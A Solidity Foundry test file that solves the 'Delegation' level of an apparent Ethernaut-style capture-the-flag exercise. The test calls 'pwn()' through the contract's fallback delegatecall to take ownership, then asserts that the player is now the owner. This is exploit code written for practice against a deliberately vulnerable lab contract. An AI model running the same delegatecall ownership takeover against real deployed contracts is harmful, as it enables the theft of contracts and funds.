// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(address(player));
        level.owner();

        (bool status,) = address(level).call(abi.encodeWithSignature("pwn()"));
        require(status, "call failed");

        assertEq(level.owner(), address(player));

        vm.stopPrank();
    }
}
